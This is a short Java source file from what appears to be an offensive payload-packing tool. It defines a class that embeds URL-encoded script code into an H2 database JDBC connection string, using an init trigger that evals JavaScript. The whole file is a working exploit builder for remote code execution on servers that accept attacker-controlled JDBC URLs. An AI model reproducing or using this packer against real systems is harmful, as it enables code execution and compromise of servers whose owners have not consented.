package com.reajason.javaweb.packer.h2;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;
import lombok.SneakyThrows;

import java.net.URLEncoder;

/**
 * @author ReaJason
 * @since 2025/6/28
 */
public class H2JSURLEncodePacker implements Packer {
    String template = "jdbc:h2:mem:a;init=CREATE TRIGGER a BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\neval(decodeURIComponent('{{script}}'))$$";

    @SneakyThrows
    @Override
    public String pack(ClassPackerConfig config) {
        String script = Packers.ScriptEngine.getInstance().pack(config);
        String encode = URLEncoder.encode(script, "UTF-8")
                .replace("+", "%20")
                .replace("%28", "(")
                .replace("%29", ")");
        return template.replace("{{script}}", encode);
    }
}
